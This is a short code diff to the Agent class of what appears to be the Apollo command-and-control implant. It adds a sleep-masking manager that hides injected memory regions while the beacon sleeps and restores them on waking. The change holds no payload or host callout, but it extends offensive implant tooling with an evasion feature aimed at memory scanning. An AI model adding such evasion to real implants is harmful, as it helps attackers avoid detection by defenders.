@@ -30,6 +30,9 @@ namespace ApolloInterop.Classes
         public IInjectionManager InjectionManager { get; protected set; }
         
         public ITicketManager TicketManager { get; protected set; }
+
+        public ISleepMaskingManager SleepMaskingManager { get; protected set; }
+
         public string UUID { get; protected set; }
 
         public Agent(string uuid)
@@ -68,6 +71,10 @@ namespace ApolloInterop.Classes
                 int maxSleep = (int)(SleepInterval * (Jitter + 1));
                 sleepTime = (int)(random.NextDouble() * (maxSleep - minSleep) + minSleep);
             }
+
+            // Mask injected memory regions before sleeping
+            SleepMaskingManager?.MaskAllRegions();
+
             WaitHandle[] sleepers = _agentSleepHandles;
             if (handles != null)
             {
@@ -77,6 +84,9 @@ namespace ApolloInterop.Classes
                 sleepers = tmp;
             }
             WaitHandle.WaitAny(sleepers, sleepTime);
+
+            // Unmask injected memory regions after waking
+            SleepMaskingManager?.UnmaskAllRegions();
         }
 
         public void AcquireOutputLock()
@@ -103,6 +113,7 @@ namespace ApolloInterop.Classes
         public virtual IInjectionManager GetInjectionManager() { return InjectionManager; }
         
         public virtual ITicketManager GetTicketManager() { return TicketManager; }
+        public virtual ISleepMaskingManager GetSleepMaskingManager() { return SleepMaskingManager; }
         public string GetUUID()
         {
             return UUID;
